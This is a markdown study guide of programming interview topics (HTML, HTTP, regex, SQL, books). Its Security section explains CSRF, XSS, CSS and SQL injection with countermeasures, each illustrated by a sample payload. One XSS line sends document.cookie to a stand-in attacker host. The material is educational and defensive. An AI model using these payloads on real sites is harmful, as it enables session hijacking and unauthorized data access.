# Tech Prep
A collection of helpful programming topics and links

## Frontend

### HTML5

#### ID Attribute

##### Description
**The ID attribute provides a document-wide unique identifier for an element.** This is used to identify the element so that stylesheets can alter its presentational properties, and scripts may alter, animate or delete its contents or presentation. Appended to the URL of the page, it provides a globally unique identifier for the element, typically a sub-section of the page.

##### Example
`<div id="content"></div>`

#### Class Attribute

##### Description
**The class attribute provides a way of classifying similar elements.** This can be used for semantic or presentation purposes. Multiple class values may be specified.

##### Example
`<div class="notation"></div>`

#### Semantic HTML

##### Description

### CSS3
- ID vs. class
- Flexbox
- Define sematic CSS

### JavaScript
- = vs. == vs. === (assignment vs. comparison operator)
- undefined vs. null
- Define closure
- How does a session cookie work in an authentication scenario?
- RESTful API (JSON vs. XML)
- Node
- RequireJS (AMD vs. CJS)
- Grunt vs. Gulp

#### Angular
- Modules
- Directives
- Factories
- Karma

#### Ember

#### Backbone

## Backend

### SQL

- Inner vs. outer join

- [http://stackoverflow.com/questions/38549/difference-between-inner-and-outer-joins](http://stackoverflow.com/questions/38549/difference-between-inner-and-outer-joins)

### HTTP & REST

#### Verbs

| Verb     | Description
-----------|--------
| `GET`    | Used to retrieve / read (not change) a resource
| `POST`   | Used to create new resources
| `PUT`    | Used to update a **complete** resource
| `PATCH`  | Used to update a **partial** resource
| `DELETE` | Used to delete a resource

#### Status Codes

| Status Code | Description
--------------|------------
| 2xx         | Success
| 3xx         | Redirection
| 4xx         | Client error
| 5xx         | Server error

#### Resources
- [http://restcookbook.com/](http://restcookbook.com/)
- [http://guides.rubyonrails.org/routing.html#crud-verbs-and-actions](http://guides.rubyonrails.org/routing.html#crud-verbs-and-actions)
- [http://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods](http://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods)

### OOP
- [SOLID](http://en.wikipedia.org/wiki/SOLID_(object-oriented_design))
- [Sandi Metz - SOLID Object-Oriented Design](http://vimeo.com/12350535)

### Ruby

#### Rails
- Concerns

### PHP
- PDO

## Misc

### Unix Epoch
An instant in time chosen as the origin of a particular era. The "epoch" then serves as a reference point from which time is measured. Time measurement units are counted from the epoch so that the date and time of events can be specified unambiguously.

January 1, 1970

### Regex

| Expression | Description
|------------|------------
| `[abc]`    | A single character of: a, b, or c
| `[^abc]`   | Any single character except: a, b, or c
| `[a-z]`    | Any single character in the range a-z
| `[a-zA-Z]` | Any single character in the range a-z or A-Z
| `^`        | Start of line
| `$`        | End of line
| `\A`       | Start of string
| `\z`       | End of string
| `.`        | Any single character
| `\s`       | Any whitespace character
| `\S`       | Any non-whitespace character
| `\d`       | Any digit
| `\D`       | Any non-digit
| `\w`       | Any word character (letter, number, underscore)
| `\W`       | Any non-word character
| `\b`       | Any word boundary
| `(...)`    | Capture everything enclosed
| `(a|b)`    | a or b
| `a?`       | Zero or one of a
| `a*`       | Zero or more of a
| `a+`       | One or more of a
| `a{3}`     | Exactly 3 of a
| `a{3,}`    | 3 or more of a
| `a{3,6}`   | Between 3 and 6 of a

### Sessions
HTTP is a stateless protocol. Sessions make it stateful.

See [http://machinesaredigging.com/2013/10/29/how-does-a-web-session-work/](http://machinesaredigging.com/2013/10/29/how-does-a-web-session-work/)
See [http://guides.rubyonrails.org/security.html#sessions](http://guides.rubyonrails.org/security.html#sessions)

### Security

#### Cross-site Request Forgery (CSRF / XSRF)

##### Description
XSRF attacks works by including a link or script in a page that accesses a site to which the user is known (or is supposed) to have been authenticated. For example, one user, Alice, might be browsing a chat forum where another user, Mallory, has posted a message. Suppose that Mallory has crafted an HTML image element that references an action on Alice's bank's website (rather than an image file). If Alice's bank keeps her authentication information in a cookie, and if the cookie hasn't expired, then the attempt by Alice's browser to load the image will submit the withdrawal form with her cookie, thus authorizing a transaction without Alice's approval.

##### Example
`<img src="http://bank.example.com/withdraw?account=Alice&amount=1000000&for=Mallory">`

##### Countermeasures
- Use GET and POST requests appropriately
- Embed additional authentication data -- such as a synchronizer token -- into requests that allows the web application to detect requests from unauthorized locations

##### Resources
- [http://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf](http://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf)

#### Cross-site Scripting (XSS)

##### Description
**The most common entry points are just about everywhere where the user can input data or any URL parameter. An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim.** XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.

##### Example
`<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>`

##### Countermeasures
**Escaping user input is essential.** It is very important to filter malicious input, but it is also important to escape the output of the web application. Whitelist filtering states the values allowed as opposed to the values not allowed. Blacklists are never complete

##### Resources
- [http://guides.rubyonrails.org/security.html#cross-site-scripting-xss](http://guides.rubyonrails.org/security.html#cross-site-scripting-xss)

#### CSS Injection

##### Description
**CSS injection is actually JavaScript injection**, because some browsers (IE, some versions of Safari and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application.

##### Example
`<div style="background:url('javascript:alert(1)')">`

##### Resources
- [http://guides.rubyonrails.org/security.html#css-injection](http://guides.rubyonrails.org/security.html#css-injection)

#### SQL Injection

##### Description
SQL injection attacks aim at **influencing database queries by manipulating web application parameters**.

##### Example
```
# Given the following user input...
# ' OR 1 --

# An incorrectly written query such as...
Project.where("name = '#{params[:name]}'")

# Will result in a malicious SQL query like this...
SELECT * FROM projects WHERE name = '' OR 1 --'
```

##### Countermeasures
- Escape special SQL characters
- Rather than strings, pass an array such as `User.where("login = ? AND password = ?", user_name, password).first`

#### Denial of Service (DoS)

##### Description
An attempt to make a machine or network resource unavailable to its intended users.

### Performance & Optimizations
- Concatentation
- Minificiation
- Reduce number of HTTP requests
- Image sprites

## Books
- [The Pragmatic Programmer](http://www.amazon.com/Pragmatic-Programmer-Journeyman-Master/dp/020161622X/ref=sr_1_1?ie=UTF8&qid=1416289440&sr=8-1&keywords=pragmatic+programmer) by Andrew Hunt
- [The Ruby Way](http://www.amazon.com/Ruby-Way-Programming-Addison-Wesley-Professional/dp/0321714636/ref=sr_1_1?ie=UTF8&qid=1416289475&sr=8-1&keywords=the+ruby+way)
- [The Rails 4 Way](http://www.amazon.com/Rails-Way-Addison-Wesley-Professional-Ruby/dp/0321944275/ref=sr_1_1?ie=UTF8&qid=1416289504&sr=8-1&keywords=the+rails+way)
- [Eloquent Ruby](http://www.amazon.com/Eloquent-Ruby-Addison-Wesley-Professional/dp/0321584104/ref=sr_1_1?ie=UTF8&qid=1416289564&sr=8-1&keywords=eloquent+ruby) by Russ Olsen
- [Mastering Regular Expressions](http://www.amazon.com/Mastering-Regular-Expressions-Jeffrey-Friedl/dp/0596528124/ref=sr_1_1?ie=UTF8&qid=1416289265&sr=8-1&keywords=Mastering+regex) by Jeffrey Friedl
- [JavaScript: The Good Parts](http://www.amazon.com/JavaScript-Good-Parts-Douglas-Crockford/dp/0596517742/ref=sr_1_1?ie=UTF8&qid=1416289323&sr=8-1&keywords=javascript+the+good+parts) by Douglas Crockford
- [Rework](http://www.amazon.com/Rework-Jason-Fried/dp/0307463745/ref=sr_1_1?ie=UTF8&qid=1416289368&sr=8-1&keywords=rework+jason+fried) by Jason Fried